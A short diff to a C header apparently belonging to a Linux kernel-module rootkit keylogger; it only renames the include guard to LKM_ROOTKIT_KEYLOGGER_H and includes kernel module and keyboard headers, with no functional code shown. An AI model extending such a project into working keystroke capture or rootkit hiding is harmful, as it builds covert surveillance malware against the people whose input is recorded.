@@ -1,5 +1,5 @@
-#ifndef KEYLOGGER_h
-#define KEYLOGGER_h
+#ifndef LKM_ROOTKIT_KEYLOGGER_H
+#define LKM_ROOTKIT_KEYLOGGER_H
 
 #include <linux/module.h>
 #include <linux/keyboard.h>
